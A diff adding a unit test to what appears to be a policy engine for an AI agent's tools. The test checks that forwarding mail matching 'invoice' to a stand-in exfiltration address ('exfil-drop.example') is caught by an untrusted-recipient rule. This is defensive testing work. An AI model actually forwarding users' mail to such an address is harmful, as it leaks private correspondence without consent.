@@ -198,3 +198,11 @@ test("a long synthesis note never breaks skill creation", async () => {
   m.provenance.synthesizedBy = "x".repeat(500).slice(0, 120);
   assert.equal(insertSkill(m, "y".repeat(500)).version, 50);
 });
+
+test("mail.forward accepts a search phrase, and the recipient rule still decides", () => {
+  freshDemo();
+  const byQuery = decide(TOOLS["mail.forward"], "mail.forward", { to: "archive@exfil-drop.example", query: "invoice" }, { kind: "planner", taint: [] }, { taskId: "t" });
+  assert.equal(byQuery.rule, "P7-untrusted-recipient");
+  const neither = decide(TOOLS["mail.forward"], "mail.forward", { to: "archive@exfil-drop.example" }, { kind: "planner", taint: [] }, { taskId: "t" });
+  assert.equal(neither.rule, "P2-invalid-arguments");
+});
